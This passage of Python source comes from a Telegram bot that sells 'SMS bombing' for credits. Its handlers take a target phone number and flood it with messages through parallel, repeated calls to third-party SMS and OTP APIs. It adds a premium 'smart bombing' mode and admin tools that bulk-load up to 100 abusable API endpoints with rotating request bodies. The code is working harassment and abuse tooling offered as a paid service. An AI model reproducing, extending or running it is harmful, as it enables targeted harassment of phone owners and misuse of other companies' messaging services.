            "💣 BOMBER STARTED",
            f"Target Number: <code>{number}</code>\n"
            f"Operator: {detect_operator(number)}\n"
            f"Amount per API: {amount}\n"
            f"Total SMS planned: {total_sms}\n"
            f"Active APIs: {total_apis}\n"
            f"User Balance before: {row[0]}"
        )
    except Exception as e:
        logger.error(f"Bomber start log error: {e}")

    msg = await update.message.reply_text(
        f"⏳ **Bombing started!**\n"
        f"📱 `{number}`\n"
        f"📡 APIs: {total_apis}\n"
        f"💥 Total: {total_sms}\n"
        f"📌 To stop: ⛔ Stop Bombing (admin)",
        parse_mode="Markdown"
    )
    
    success_count = 0
    failed_count = 0
    interval = float(get_setting('api_call_interval', '0.05'))
    timeout = int(get_setting('api_timeout', '15'))
    parallel = int(get_setting('parallel_requests', '5'))
    
    BOMBING_TASKS[user_id] = {
        "active": True,
        "msg": msg,
        "number": number,
        "total": total_sms
    }
    
    semaphore = asyncio.Semaphore(parallel)
    stop_requested = False
    
    async def call_api(api, index):
        nonlocal success_count, failed_count, stop_requested
        api_success = 0
        api_name = api.get('name', f'API_{index}')
        
        async with semaphore:
            for j in range(amount):
                if not BOMBING_ACTIVE or not BOMBING_TASKS.get(user_id, {}).get('active', True):
                    stop_requested = True
                    break
                
                try:
                    body = replace_phone(api.get('body', {}), number)
                    await asyncio.sleep(interval)
                    
                    if api.get('method', 'POST').upper() == 'GET':
                        success, text, status = await safe_api_call(
                            api.get('url'),
                            method='GET',
                            params=body,
                            timeout=timeout
                        )
                    else:
                        success, text, status = await safe_api_call(
                            api.get('url'),
                            method='POST',
                            data=body,
                            timeout=timeout
                        )
                    
                    if success and check_success(text, status):
                        api_success += 1
                        success_count += 1
                    else:
                        failed_count += 1
                        
                except Exception as e:
                    failed_count += 1
                    logger.error(f"API error {api_name}: {e}")
                
                total_done = (index * amount) + (j+1)
                if total_done % 20 == 0 or total_done == total_sms:
                    try:
                        bar = progress_bar(total_done, total_sms)
                        await msg.edit_text(
                            f"⏳ Bombing...\n"
                            f"{bar}\n"
                            f"✅ Success: {success_count} | ❌ Failed: {failed_count}\n"
                            f"📊 {total_done}/{total_sms}",
                            parse_mode="Markdown"
                        )
                    except:
                        pass
                
                if stop_requested:
                    break
        
        await track_api(api_name, api_success > 0, user_id)
        return api_success
    
    tasks = []
    for i, api in enumerate(active_apis):
        task = asyncio.create_task(call_api(api, i))
        tasks.append(task)
    
    await asyncio.gather(*tasks)
    
    if user_id in BOMBING_TASKS:
        del BOMBING_TASKS[user_id]
    
    if stop_requested or not BOMBING_ACTIVE:
        await msg.edit_text(
            f"⛔ **Bombing stopped!**\n\n"
            f"📱 `{number}`\n"
            f"✅ Success: {success_count}\n"
            f"❌ Failed: {failed_count}\n"
            f"📊 Total: {success_count + failed_count}/{total_sms}\n\n"
            f"⚠️ Stopped by admin.",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )
        context.user_data.clear()
        return
    
    cost = int(get_setting('bomber_cost', '1'))
    total_cost = total_sms * cost
    await conn.execute(
        "UPDATE users SET balance = balance - ?, total_bombing = total_bombing + 1 WHERE user_id = ?",
        (total_cost, user_id)
    )
    await conn.commit()
    await check_achievements(user_id)
    
    success_rate = round((success_count / total_sms) * 100, 2) if total_sms > 0 else 0

    # ===== PRIVATE LOG: Bomber finished =====
    try:
        user = update.effective_user
        await log_user_action(
            context,
            user,
            "💣 BOMBER FINISHED",
            f"Target Number: <code>{number}</code>\n"
            f"✅ Success: {success_count}\n"
            f"❌ Failed: {failed_count}\n"
            f"Total attempted: {success_count + failed_count}\n"
            f"Success Rate: {success_rate}%\n"
            f"Cost: {total_cost} credits"
        )
    except Exception as e:
        logger.error(f"Bomber finish log error: {e}")
    
    await msg.edit_text(
        f"✅ **Bombing completed!**\n\n"
        f"📱 `{number}`\n"
        f"💥 Total: {total_sms}\n"
        f"✅ Success: {success_count}\n"
        f"❌ Failed: {failed_count}\n"
        f"📊 Success Rate: {success_rate}%\n"
        f"💰 Cost: {total_cost} credits",
        parse_mode="Markdown",
        reply_markup=get_main_keyboard()
    )
    context.user_data.clear()

# ===================== BULK SMS =====================
async def cmd_bulk_sms(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global SMS_API_URL, SMS_API_KEY
    user_id = update.effective_user.id
    
    if not SMS_API_URL or not SMS_API_KEY:
        await update.message.reply_text("❌ SMS API not configured!", reply_markup=get_main_keyboard())
        return
    
    conn = await get_db()
    cursor = await conn.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
    row = await cursor.fetchone()
    
    if not row or row[0] < 1:
        await update.message.reply_text("❌ Insufficient credits!", reply_markup=get_main_keyboard())
        return
    
    await update.message.reply_text("📤 **Bulk SMS**\n\nEnter numbers (comma, space or newline separated):", parse_mode="Markdown", reply_markup=get_back_keyboard())
    context.user_data['state'] = 'bulk_numbers'

async def bulk_numbers(update: Update, context: ContextTypes.DEFAULT_TYPE):
    raw = update.message.text.strip()
    numbers = [num.strip() for num in re.split(r'[,\s\n]+', raw) if num.strip()]
    
    valid = []
    seen = set()
    for num in numbers:
        if num in seen:
            continue
        seen.add(num)
        if num.isdigit() and len(num) == 11:
            valid.append(num)
    
    if not valid:
        await update.message.reply_text("❌ No valid numbers! Enter 11-digit numbers.", reply_markup=get_back_keyboard())
        return
    
    max_bulk = int(get_setting('max_bulk_numbers', '50'))
    if len(valid) > max_bulk:
        await update.message.reply_text(f"❌ Maximum {max_bulk} numbers!", reply_markup=get_back_keyboard())
        return
    
    context.user_data['bulk_numbers'] = valid
    context.user_data['state'] = 'bulk_message'
    await update.message.reply_text(f"✅ {len(valid)} numbers accepted!\n\n💬 **Enter message:**", parse_mode="Markdown", reply_markup=get_back_keyboard())

async def bulk_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    msg_text = update.message.text.strip()
    
    numbers = context.user_data.get('bulk_numbers', [])
    if not numbers:
        await update.message.reply_text("❌ Error!", reply_markup=get_main_keyboard())
        context.user_data.clear()
        return
    
    total = len(numbers)
    
    conn = await get_db()
    cursor = await conn.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
    row = await cursor.fetchone()
    
    if row and row[0] < total:
        await update.message.reply_text(f"❌ Insufficient credits!\nRequired: {total}", reply_markup=get_main_keyboard())
        context.user_data.clear()
        return
    
    # ===== PRIVATE LOG: Bulk SMS started =====
    try:
        user = update.effective_user
        await log_user_action(
            context,
            user,
            "📤 BULK SMS STARTED",
            f"Numbers count: {total}\n"
            f"First few: {', '.join(numbers[:5])}\n"
            f"Message length: {len(msg_text)}"
        )
    except Exception as e:
        logger.error(f"Bulk start log error: {e}")

    status_msg = await update.message.reply_text(f"⏳ Sending to {total} numbers...", parse_mode="Markdown")
    
    success_list = []
    failed_list = []
    credit_used = 0
    interval = float(get_setting('bulk_sms_interval', '0.03'))
    
    for idx, num in enumerate(numbers, 1):
        success, response = await send_sms_api(num, msg_text)
        
        if success:
            success_list.append(num)
            await track_api("Custom_SMS", True, user_id)
        else:
            failed_list.append(num)
            await track_api("Custom_SMS", False, user_id)
        
        await conn.execute("UPDATE users SET balance = balance - 1, total_sms = total_sms + 1 WHERE user_id = ?", (user_id,))
        await conn.commit()
        credit_used += 1
        
        if idx % 10 == 0 or idx == total:
            try:
                bar = progress_bar(idx, total)
                await status_msg.edit_text(f"⏳ Sending...\n{bar}\n📊 {idx}/{total}", parse_mode="Markdown")
            except:
                pass
        
        await asyncio.sleep(interval)
    
    await check_achievements(user_id)
    
    result = f"✅ **Bulk SMS completed!**\n\n📤 Total: {total}\n✅ Success: {len(success_list)}\n❌ Failed: {len(failed_list)}\n💰 Cost: {credit_used} credits"
    
    if failed_list:
        result += f"\n\n❌ Failed: {', '.join(failed_list[:5])}"

    # ===== PRIVATE LOG: Bulk SMS finished =====
    try:
        user = update.effective_user
        await log_user_action(
            context,
            user,
            "📤 BULK SMS FINISHED",
            f"Total: {total}\n"
            f"✅ Success: {len(success_list)}\n"
            f"❌ Failed: {len(failed_list)}\n"
            f"Cost: {credit_used} credits"
        )
    except Exception as e:
        logger.error(f"Bulk finish log error: {e}")
    
    await status_msg.edit_text(result, parse_mode="Markdown", reply_markup=get_main_keyboard())
    context.user_data.clear()

# ===================== REDEEM =====================
async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🎟️ **Enter redeem code:**\n\n🔹 Use codes created by admin",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )
    context.user_data['state'] = 'redeem_code'

async def redeem_process(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    code = update.message.text.strip().upper()
    
    conn = await get_db()
    
    cursor = await conn.execute("SELECT 1 FROM redeem_history WHERE user_id = ? AND code = ?", (user_id, code))
    if await cursor.fetchone():
        await update.message.reply_text("❌ You have already used this code!", reply_markup=get_main_keyboard())
        context.user_data.clear()
        return
    
    cursor = await conn.execute("SELECT amount, usages FROM redeem_codes WHERE code = ?", (code,))
    row = await cursor.fetchone()
    
    if not row or row[1] <= 0:
        await update.message.reply_text("❌ Invalid or expired code!", reply_markup=get_main_keyboard())
        context.user_data.clear()
        return
    
    amount = row[0]
    await conn.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, user_id))
    await conn.execute("UPDATE redeem_codes SET usages = usages - 1 WHERE code = ?", (code,))
    await conn.execute("INSERT INTO redeem_history (user_id, code) VALUES (?, ?)", (user_id, code))
    await conn.commit()

    # ===== PRIVATE LOG: Redeem code used =====
    try:
        user = update.effective_user
        await log_user_action(
            context,
            user,
            "🎟️ REDEEM CODE USED",
            f"Code: <code>{code}</code>\n"
            f"Amount: +{amount} credits"
        )
    except Exception as e:
        logger.error(f"Redeem log error: {e}")
    
    await update.message.reply_text(f"🎉 **Code redeemed!**\n✅ +{amount} credits", parse_mode="Markdown", reply_markup=get_main_keyboard())
    context.user_data.clear()

# ===================== PREMIUM =====================
async def premium_features(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    conn = await get_db()
    cursor = await conn.execute("SELECT is_premium, premium_expiry FROM users WHERE user_id = ?", (user_id,))
    row = await cursor.fetchone()
    
    is_prem = row and row[0] == 1 and not is_premium_expired(row[1])
    if row and row[0] == 1 and is_premium_expired(row[1]):
        await conn.execute("UPDATE users SET is_premium = 0, premium_expiry = NULL WHERE user_id = ?", (user_id,))
        is_prem = False
    
    text = "👑 **Premium Features**\n\n"
    text += "🔹 Smart Bombing\n"
    text += "🔹 Extra Daily Bonus - 10 credits\n"
    text += "🔹 Lower SMS Cost - 0.5 credits\n"
    text += "🔹 Priority Support\n\n"
    
    if is_prem:
        text += "✅ **You are a Premium User!**"
    else:
        price = get_setting('premium_price', '100')
        duration = get_setting('premium_duration', '30')
        text += f"💎 To get Premium: {price} credits / {duration} days\n"
        text += "📌 Use `/buy_premium` command"
    
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=get_main_keyboard())

async def buy_premium(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    conn = await get_db()
    cursor = await conn.execute("SELECT is_premium, premium_expiry, balance FROM users WHERE user_id = ?", (user_id,))
    row = await cursor.fetchone()
    
    if not row:
        await update.message.reply_text("❌ User not found!", reply_markup=get_main_keyboard())
        return
    
    if row[0] == 1 and not is_premium_expired(row[1]):
        await update.message.reply_text("✅ You are already Premium!", reply_markup=get_main_keyboard())
        return
    
    if row[0] == 1 and is_premium_expired(row[1]):
        await conn.execute("UPDATE users SET is_premium = 0, premium_expiry = NULL WHERE user_id = ?", (user_id,))
        row = (0, None, row[2])
    
    price = int(get_setting('premium_price', '100'))
    duration = int(get_setting('premium_duration', '30'))
    
    if row[2] < price:
        await update.message.reply_text(
            f"❌ Insufficient credits!\n\n💰 Required: {price}\n💰 Your balance: {row[2]}",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )
        return
    
    expiry = (datetime.now() + timedelta(days=duration)).isoformat()
    await conn.execute(
        "UPDATE users SET is_premium = 1, premium_expiry = ?, balance = balance - ? WHERE user_id = ?",
        (expiry, price, user_id)
    )
    await conn.commit()

    # ===== PRIVATE LOG: Premium purchased =====
    try:
        user = update.effective_user
        await log_user_action(
            context,
            user,
            "👑 PREMIUM PURCHASED",
            f"Price: {price} credits\n"
            f"Duration: {duration} days\n"
            f"Expiry: {expiry[:10]}"
        )
    except Exception as e:
        logger.error(f"Premium log error: {e}")
    
    await update.message.reply_text(
        f"🎉 **Premium activated!**\n\n📅 Duration: {duration} days",
        parse_mode="Markdown",
        reply_markup=get_main_keyboard()
    )

# ===================== SMART BOMBING =====================
async def smart_bombing(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global BOMBING_ACTIVE
    
    if not BOMBING_ACTIVE:
        await update.message.reply_text(
            "⛔ **Bombing is currently disabled!**\n\n"
            "📌 Admin has stopped bombing.",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )
        return
    
    user_id = update.effective_user.id
    
    conn = await get_db()
    cursor = await conn.execute("SELECT is_premium, premium_expiry FROM users WHERE user_id = ?", (user_id,))
    row = await cursor.fetchone()
    
    is_prem = row and row[0] == 1 and not is_premium_expired(row[1])
    if row and row[0] == 1 and is_premium_expired(row[1]):
        await conn.execute("UPDATE users SET is_premium = 0, premium_expiry = NULL WHERE user_id = ?", (user_id,))
        is_prem = False
    
    if not is_prem:
        await update.message.reply_text("❌ **Premium users only!**\nUse `/buy_premium`.", parse_mode="Markdown", reply_markup=get_main_keyboard())
        return
    
    if not BOMBER_APIS:
        await update.message.reply_text("❌ No bomber APIs configured!", reply_markup=get_main_keyboard())
        return
    
    await update.message.reply_text("🎯 **Smart Bombing**\n\nEnter target number:", parse_mode="Markdown", reply_markup=get_back_keyboard())
    context.user_data['state'] = 'smart_bombing_number'

async def smart_bombing_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    number = update.message.text.strip()
    valid, msg = validate_phone(number)
    if not valid:
        await update.message.reply_text(f"❌ {msg}", reply_markup=get_back_keyboard())
        return
    
    context.user_data['smart_number'] = number
    context.user_data['state'] = 'smart_bombing_amount'
    await update.message.reply_text(f"✅ `{number}`\n\n💥 **Enter amount (1-100):**", parse_mode="Markdown", reply_markup=get_back_keyboard())

async def smart_bombing_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global BOMBING_ACTIVE
    
    if not BOMBING_ACTIVE:
        await update.message.reply_text(
            "⛔ **Bombing is disabled!**\n\n"
            "📌 Admin has stopped bombing.",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )
        context.user_data.clear()
        return
    
    user_id = update.effective_user.id
    number = context.user_data.get('smart_number')
    
    try:
        amount = int(update.message.text.strip())
        if amount < 1 or amount > 100:
            await update.message.reply_text("❌ Enter between 1-100!", reply_markup=get_back_keyboard())
            return
    except ValueError:
        await update.message.reply_text("❌ Enter a valid number!", reply_markup=get_back_keyboard())
        return
    
    smart_apis = [api for api in BOMBER_APIS if api.get('active', True)][:20]
    total_sms = len(smart_apis) * amount
    
    conn = await get_db()
    cursor = await conn.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
    row = await cursor.fetchone()
    
    if not row or row[0] < total_sms:
        await update.message.reply_text(f"❌ Insufficient credits!", reply_markup=get_main_keyboard())
        context.user_data.clear()
        return
    
    # ===== PRIVATE LOG: Smart Bombing started =====
    try:
        user = update.effective_user
        await log_user_action(
            context,
            user,
            "🎯 SMART BOMBING STARTED",
            f"Target Number: <code>{number}</code>\n"
            f"Operator: {detect_operator(number)}\n"
            f"Amount per API: {amount}\n"
            f"APIs used: {len(smart_apis)}\n"
            f"Total SMS planned: {total_sms}"
        )
    except Exception as e:
        logger.error(f"Smart bomb start log error: {e}")

    msg = await update.message.reply_text(f"🧠 **Smart Bombing started!**\n📱 `{number}`\n📡 APIs: {len(smart_apis)}", parse_mode="Markdown")
    
    success_count = 0
    failed_count = 0
    interval = float(get_setting('api_call_interval', '0.05'))
    timeout = int(get_setting('api_timeout', '15'))
    
    async with aiohttp.ClientSession() as session:
        for i, api in enumerate(smart_apis, 1):
            api_success = 0
            api_name = api.get('name', f'API_{i}')
            
            for j in range(amount):
                if not BOMBING_ACTIVE:
                    await msg.edit_text("⛔ **Bombing stopped!**", parse_mode="Markdown")
                    context.user_data.clear()
                    return
                
                try:
                    body = replace_phone(api.get('body', {}), number)
                    await asyncio.sleep(interval)
                    
                    if api.get('method', 'POST').upper() == 'GET':
                        success, text, status = await safe_api_call(
                            api.get('url'),
                            method='GET',
                            params=body,
                            timeout=timeout
                        )
                    else:
                        success, text, status = await safe_api_call(
                            api.get('url'),
                            method='POST',
                            data=body,
                            timeout=timeout
                        )
                    
                    if success and check_success(text, status):
                        api_success += 1
                        success_count += 1
                    else:
                        failed_count += 1
                        
                except Exception as e:
                    failed_count += 1
                    logger.error(f"Smart API error: {e}")
                
                total_done = (i-1) * amount + (j+1)
                if total_done % 10 == 0 or total_done == total_sms:
                    try:
                        bar = progress_bar(total_done, total_sms)
                        await msg.edit_text(f"🧠 **Smart Bombing...**\n{bar}\n✅ Success: {success_count}", parse_mode="Markdown")
                    except:
                        pass
    
    cost = float(get_setting('premium_sms_cost', '0.5'))
    total_cost = total_sms * cost
    await conn.execute("UPDATE users SET balance = balance - ? WHERE user_id = ?", (total_cost, user_id))
    await conn.commit()
    
    # ===== PRIVATE LOG: Smart Bombing finished =====
    try:
        user = update.effective_user
        await log_user_action(
            context,
            user,
            "🎯 SMART BOMBING FINISHED",
            f"Target Number: <code>{number}</code>\n"
            f"✅ Success: {success_count}\n"
            f"❌ Failed: {failed_count}\n"
            f"Cost: {total_cost} credits"
        )
    except Exception as e:
        logger.error(f"Smart bomb finish log error: {e}")

    await msg.edit_text(
        f"✅ **Smart Bombing completed!**\n\n📱 `{number}`\n✅ Success: {success_count}\n❌ Failed: {failed_count}",
        parse_mode="Markdown",
        reply_markup=get_main_keyboard()
    )
    context.user_data.clear()

# ===================== CONTACT =====================
async def contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("📩 Admin", url=f"https://t.me/{ADMIN_USERNAME}")],
        [InlineKeyboardButton("📢 Channel", url="https://t.me/RobiEntertainment")]
    ]
    await update.message.reply_text(
        f"📞 **Contact**\n\n👨‍💻 Admin: @{ADMIN_USERNAME}\n👨‍💻 Owner: @{OWNER_USERNAME}",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

# ===================== SIMPLE API ADD FUNCTION =====================
async def admin_add_simple_api(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    
    await update.message.reply_text(
        "⚡ **Simple API Add**\n\n"
        "Just provide the API URL, everything else will be default:\n"
        "`https://api.example.com/endpoint`\n\n"
        "📌 Default: METHOD=POST, TYPE=bomber\n"
        "📌 Body: `{\"phone\":\"{phone}\"}`",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )
    context.user_data['admin_state'] = 'add_simple_api'

async def admin_add_bulk_apis(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    
    await update.message.reply_text(
        "📦 **Bulk API Add**\n\n"
        "Provide one API URL per line:\n\n"
        "`https://api.example1.com/endpoint`\n"
        "`https://api.example2.com/endpoint`\n"
        "`https://api.example3.com/endpoint`\n\n"
        "📌 All will be added at once!\n"
        "📌 Maximum 50 URLs",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )
    context.user_data['admin_state'] = 'add_bulk_apis'

async def add_bulk_apis_large(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    
    await update.message.reply_text(
        "📦 **Bulk API Add (Large List)**\n\n"
        "Provide one API URL per line:\n\n"
        "Example:\n"
        "`https://api1.example.com/endpoint`\n"
        "`https://api2.example.com/endpoint`\n"
        "`https://api3.example.com/endpoint`\n\n"
        "📌 Up to 100 at once!\n"
        "📌 Each API will send 100 SMS",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )
    context.user_data['admin_state'] = 'add_bulk_apis_large'

async def process_simple_api(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    
    url = update.message.text.strip()
    
    if not url.startswith('http'):
        await update.message.reply_text("❌ Invalid URL! Start with `http://` or `https://`.", parse_mode="Markdown")
        return
    
    name = url.replace('https://', '').replace('http://', '').split('/')[0].replace('.', '_')
    name = name[:30]
    body = '{"phone":"{phone}"}'
    
    try:
        conn = await get_db()
        
        cursor = await conn.execute("SELECT 1 FROM apis WHERE name = ?", (name,))
        if await cursor.fetchone():
            await update.message.reply_text(f"❌ API named `{name}` already exists!", parse_mode="Markdown")
            context.user_data['admin_state'] = None
            return
        
        await conn.execute(
            "INSERT INTO apis (name, method, url, body, api_type, added_by) VALUES (?, ?, ?, ?, ?, ?)",
            (name, "POST", url, body, "bomber", ADMIN_ID)
        )
        await conn.commit()
        await admin_log(ADMIN_ID, "Added Simple API", None, f"{name}: {url}")
        await load_apis()
        
        await update.message.reply_text(
            f"✅ **API added!**\n\n"
            f"📡 Name: `{name}`\n"
            f"🌐 URL: `{url}`\n"
            f"📝 Type: bomber\n"
            f"🔧 Method: POST",
            parse_mode="Markdown",
            reply_markup=get_api_manager_menu()
        )
    except Exception as e:
        if "UNIQUE" in str(e):
            await update.message.reply_text(f"❌ API named `{name}` already exists!", parse_mode="Markdown")
        else:
            await update.message.reply_text(f"❌ Error: {str(e)}")
    
    context.user_data['admin_state'] = None

async def process_bulk_apis(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    
    lines = update.message.text.strip().split('\n')
    urls = [line.strip() for line in lines if line.strip().startswith('http')]
    
    if not urls:
        await update.message.reply_text("❌ No valid URLs found!", reply_markup=get_api_manager_menu())
        context.user_data['admin_state'] = None
        return
    
    if len(urls) > 50:
        await update.message.reply_text("❌ Maximum 50 APIs at once!", reply_markup=get_api_manager_menu())
        context.user_data['admin_state'] = None
        return
    
    msg = await update.message.reply_text(f"⏳ Adding {len(urls)} APIs...")
    
    success_count = 0
    failed_list = []
    conn = await get_db()
    
    for url in urls:
        try:
            name = url.replace('https://', '').replace('http://', '').split('/')[0].replace('.', '_')
            name = name[:30]
            
            cursor = await conn.execute("SELECT 1 FROM apis WHERE name = ?", (name,))
            if await cursor.fetchone():
                failed_list.append(f"{name} (already exists)")
                continue
            
            body = '{"phone":"{phone}"}'
            
            await conn.execute(
                "INSERT INTO apis (name, method, url, body, api_type, added_by) VALUES (?, ?, ?, ?, ?, ?)",
                (name, "POST", url, body, "bomber", ADMIN_ID)
            )
            success_count += 1
            
        except Exception as e:
            failed_list.append(f"{url[:30]}... ({str(e)[:30]})")
    
    await conn.commit()
    await admin_log(ADMIN_ID, "Added Bulk APIs", None, f"{success_count} APIs added")
    await load_apis()
    
    result = f"📦 **Bulk API add completed!**\n\n"
    result += f"✅ Success: {success_count}\n"
    result += f"❌ Failed: {len(failed_list)}"
    
    if failed_list:
        result += f"\n\n❌ Failed APIs:\n"
        for item in failed_list[:10]:
            result += f"├─ {item}\n"
    
    await msg.edit_text(result, parse_mode="Markdown", reply_markup=get_api_manager_menu())
    context.user_data['admin_state'] = None

async def process_bulk_apis_large(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    
    lines = update.message.text.strip().split('\n')
    urls = [line.strip() for line in lines if line.strip().startswith('http')]
    
    if not urls:
        await update.message.reply_text("❌ No valid URLs found!", reply_markup=get_api_manager_menu())
        context.user_data['admin_state'] = None
        return
    
    if len(urls) > 100:
        await update.message.reply_text("❌ Maximum 100 APIs at once!", reply_markup=get_api_manager_menu())
        context.user_data['admin_state'] = None
        return
    
    msg = await update.message.reply_text(f"⏳ Adding {len(urls)} APIs...")
    
    success_count = 0
    failed_list = []
    conn = await get_db()
    
    body_templates = [
        '{"phone":"{phone}"}',
        '{"mobile":"{phone}"}',
        '{"msisdn":"{phone}"}',
        '{"phone_number":"{phone}"}',
        '{"mobileNumber":"{phone}"}'
    ]
    
    for idx, url in enumerate(urls):
        try:
            name = url.replace('https://', '').replace('http://', '').split('/')[0].replace('.', '_')
            name = name[:30]
            if idx > 0:
                name = f"{name}_{idx}"
            
            cursor = await conn.execute("SELECT 1 FROM apis WHERE name = ?", (name,))
            if await cursor.fetchone():
                failed_list.append(f"{name} (already exists)")
                continue
            
            body = random.choice(body_templates)
            
            await conn.execute(
                "INSERT INTO apis (name, method, url, body, api_type, added_by) VALUES (?, ?, ?, ?, ?, ?)",
                (name, "POST", url, body, "bomber", ADMIN_ID)
            )
            success_count += 1
            
            if success_count % 10 == 0:
                try:
                    await msg.edit_text(f"⏳ {success_count}/{len(urls)} APIs added...")
                except:
                    pass
            
        except Exception as e:
            failed_list.append(f"{url[:30]}... ({str(e)[:30]})")
    
    await conn.commit()
    await admin_log(ADMIN_ID, "Added Bulk APIs Large", None, f"{success_count} APIs added")
    await load_apis()
    
    result = f"📦 **Bulk API add completed!**\n\n"
    result += f"✅ Success: {success_count}\n"
    result += f"❌ Failed: {len(failed_list)}\n"
    result += f"📡 Total APIs: {len(BOMBER_APIS)}"
    
    if failed_list:
        result += f"\n\n❌ Failed APIs:\n"
        for item in failed_list[:10]:
            result += f"├─ {item}\n"
    
    await msg.edit_text(result, parse_mode="Markdown", reply_markup=get_api_manager_menu())
    context.user_data['admin_state'] = None

# ===================== MESSAGE HANDLER =====================
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    message = update.message.text
    
    # Clean message (remove color emoji)
    clean_message = message
    for emoji in ["🟦", "🟩", "🟪", "🟧", "🟨", "🟥", "🩷", "⬜"]:
        clean_message = clean_message.replace(emoji, "").strip()
    
    # Group check (only for regular users, not admin)
    if user_id != ADMIN_ID:
        in_group = await check_group_membership(user_id, context)
        if not in_group:
            await send_group_required_message(update, context)
            return
    
    # Back button handling
    if clean_message == "🔙 Back" or clean_message == "🔙 Main Menu":
        context.user_data.clear()
        if user_id == ADMIN_ID:
            await update.message.reply_text("🛡️ **Admin Panel**", parse_mode="Markdown", reply_markup=get_admin_main_menu())
        else:
            await update.message.reply_text("🏠 **Main Menu**", parse_mode="Markdown", reply_markup=get_main_keyboard())
        return
    
    # Utilities menu
    if clean_message == "🔮 Utilities":
        await update.message.reply_text("🔮 **Utilities**\n\nSelect an option:", parse_mode="Markdown", reply_markup=get_utilities_keyboard())
        return
    
    # Fun menu
    if clean_message == "🎮 Fun":
        await update.message.reply_text("🎮 **Fun Menu**\n\nSelect an option:", parse_mode="Markdown", reply_markup=get_fun_keyboard())
        return
    
    # Sports menu
    if clean_message == "⚽ Sports":
        await update.message.reply_text("⚽ **Sports Menu**\n\nSelect an option:", parse_mode="Markdown", reply_markup=get_sports_keyboard())
        return
    
    # Finance menu
    if clean_message == "💰 Finance":
        await update.message.reply_text("💰 **Finance Menu**\n\nSelect an option:", parse_mode="Markdown", reply_markup=get_finance_keyboard())
        return
    
    # Admin menu handling
    if user_id == ADMIN_ID:
        admin_menu_handlers = {
            "📊 Management": lambda: update.message.reply_text("📊 **Management Menu**", parse_mode="Markdown", reply_markup=get_management_menu()),
            "📨 Campaign": lambda: update.message.reply_text("📨 **Campaign Menu**", parse_mode="Markdown", reply_markup=get_campaign_menu()),
            "🔧 Settings": lambda: update.message.reply_text("🔧 **Settings Menu**", parse_mode="Markdown", reply_markup=get_settings_menu()),
            "📈 Reports": lambda: update.message.reply_text("📈 **Reports Menu**", parse_mode="Markdown", reply_markup=get_reports_menu()),
            "📡 API Manager": lambda: admin_api_manager(update, context),
            "📅 Daily Active Users": lambda: admin_daily_active_users(update, context),
            "Daily Active Users": lambda: admin_daily_active_users(update, context),
            "📡 Monitor": lambda: admin_monitor(update, context),
            "Monitor": lambda: admin_monitor(update, context),
            "🔥 Firebase Manager": lambda: admin_firebase_manager(update, context),
            "Firebase Manager": lambda: admin_firebase_manager(update, context),
            "Remove Dead Firebase": lambda: admin_remove_dead_firebase(update, context),
            "🔥 Remove Dead Firebase": lambda: admin_remove_dead_firebase(update, context),
            "Add Firebase URL": lambda: admin_firebase_add_url_prompt(update, context),
            "🔥 Add Firebase URL": lambda: admin_firebase_add_url_prompt(update, context),
            "Add Firebase TXT": lambda: admin_firebase_add_txt_prompt(update, context),
            "🔥 Add Firebase TXT": lambda: admin_firebase_add_txt_prompt(update, context),
            "List Firebase": lambda: admin_list_firebase(update, context),
            "🔥 List Firebase": lambda: admin_list_firebase(update, context),
            "Test Firebase": lambda: admin_test_firebase(update, context),
            "🔥 Test Firebase": lambda: admin_test_firebase(update, context),
            "Keep Active Only": lambda: admin_keep_active_firebase(update, context),
            "🔥 Keep Active Only": lambda: admin_keep_active_firebase(update, context),
            "Back to API Manager": lambda: admin_api_manager(update, context),
            "🔙 Back to API Manager": lambda: admin_api_manager(update, context),
            "📊 API Inventory": lambda: admin_api_inventory(update, context),
            "📊 View All APIs": lambda: admin_view_all_apis(update, context),
            "💰 Recharge API": lambda: admin_recharge_api(update, context),
            "🎁 Daily Bonus Control": lambda: admin_daily_bonus_control(update, context),
            "🎟️ Redeem Control": lambda: admin_redeem_control(update, context),
            "💰 Balance Control": lambda: admin_balance_control(update, context),
            "👥 User Control": lambda: admin_user_control(update, context),
            "📋 API List": lambda: admin_api_list(update, context),
            "📜 Admin Logs": lambda: tail_log(update, context),
            "🗑️ Clear Logs": lambda: clear_logs(update, context),
            "🧪 Test API": lambda: test_api(update, context),
            "📊 Live Stats": lambda: admin_live_stats(update, context),
            "📈 API Stats": lambda: admin_api_stats(update, context),
